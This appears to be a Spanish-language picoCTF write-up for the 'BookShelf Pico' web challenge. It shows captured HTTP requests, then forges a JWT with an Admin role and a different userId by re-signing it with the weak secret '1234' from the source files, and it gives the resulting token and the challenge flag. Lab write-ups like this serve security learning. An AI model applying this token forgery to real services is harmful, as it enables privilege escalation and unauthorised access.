
## Descripción

*BookShelf Pico, my premium online book-reading service.I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/484/bookshelf-pico.zip).Website can be accessed [here!](http://saturn.picoctf.net:53059/).*
## Pistas

*Maybe try to find the JWT Signing Key ("secret key") in the 
source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?*

*The 'role' and 'userId' fields in the JWT can be of interest to you!*
*The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.*

*Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.*
## Solución


```
*Abrimos burpsuite*
*le pasamos el url*
*nos muestra el get:*
GET / HTTP/1.1
Host: saturn.picoctf.net:53059
Accept-Language: es-419,es;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

*Ahora nos da el post de conexion*
POST /base/login HTTP/1.1
Host: saturn.picoctf.net:53059
Content-Length: 34
Accept-Language: es-419,es;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Origin: http://saturn.picoctf.net:53059
Referer: http://saturn.picoctf.net:53059/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

{"email":"user","password":"user"}

*elegeimos el libro flag*
*nos muestra un get con un jwt*
GET /base/books/cover/5 HTTP/1.1
Host: saturn.picoctf.net:53059
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM2OTQ3NCwiaWF0IjoxNzQ0NzY0Njc0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.zvMZM4Q61erahnAMCs8X7wBE6VnRA6MmGCWWmWCVb9k
Accept-Language: es-419,es;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Referer: http://saturn.picoctf.net:53059/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

*para saber que es entramos a jwt.io*
*como no tenemos permiso de admin cambiamos el jwt a usuario admin y id 2 y contraseña con el 1234 q viene en los archivos del proyecto  *
{

  "typ": "JWT",

  "alg": "HS256"

}

PAYLOAD:DATA

{

  "role": "Admin",

  "iss": "bookshelf",

  "exp": 1745372355,

  "iat": 1744767555,

  "userId": 2,

  "email": "admin"

}

VERIFY SIGNATURE

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  1234
) secret base64 encoded
*nos da un nuevo*: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNzIzNTUsImlhdCI6MTc0NDc2NzU1NSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.6jfM0GQF9dmwxKQ5XIz7KBq4MEPjp_EGNjaclrLvU_g

*lo modificamos en el codigo actualizamos y nos muestra la bandera.*
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}


```
picoCTF{w34k_jwt_n0t_g00d_6e5d7df5}
## Notas Adicionales 

*tambien se puede modificar desde inspeccionar en aplicacion,almacenamiento interno cambiamos el 
|auth-token|eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNzIzNTUsImlhdCI6MTc0NDc2NzU1NSwidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.6jfM0GQF9dmwxKQ5XIz7KBq4MEPjp_EGNjaclrLvU_g

y el token-payload:
{ "role": "Admin", "iss": "bookshelf", "exp": 1745372355, "iat": 1744767555, "userId": 2, "email": "admin" }
actualizamos y nos da la bandera.
## Referencias 
http://saturn.picoctf.net:53059/#/
